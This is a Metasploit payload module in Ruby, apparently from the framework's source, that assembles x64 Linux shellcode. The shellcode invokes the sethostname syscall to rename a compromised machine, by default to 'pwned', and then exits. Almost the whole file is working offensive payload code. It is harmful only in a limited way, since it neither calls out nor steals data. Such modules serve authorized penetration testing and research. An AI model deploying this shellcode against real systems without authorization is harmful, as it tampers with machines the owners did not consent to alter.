##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 40

  include Msf::Payload::Single
  include Msf::Payload::Linux

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Linux Set Hostname',
        'Description' => 'Sets the hostname of the machine.',
        'Author' => 'Muzaffer Umut ŞAHİN <mailatmayinlutfen@gmail.com>',
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_X64,
        'Privileged' => true
      )
    )

    register_options(
      [
        OptString.new('HOSTNAME', [true, 'The hostname to set.', 'pwned'])
      ]
    )
  end

  def generate(_opts = {})
    hostname = (datastore['HOSTNAME'] || 'pwned').gsub(/\s+/, '') # remove all whitespace from hostname.
    length = hostname.length
    if length > 0xff
      fail_with(Msf::Module::Failure::BadConfig, 'HOSTNAME must be less than 255 characters.')
    end

    payload = %^
      push 0xffffffffffffff56 ; sethostname() syscall number.
      pop rax
      neg rax
      jmp str

    end:
      push #{length}
      pop rsi
      pop rdi    ; rdi points to the hostname string.
      xor byte [rdi+rsi], 0x41
      syscall

      push 60    ; exit() syscall number.
      pop rax
      xor rdi,rdi
      syscall

    str:
      call end
      db "#{hostname}A"
    ^

    Metasm::Shellcode.assemble(Metasm::X64.new, payload).encode_string
  end
end
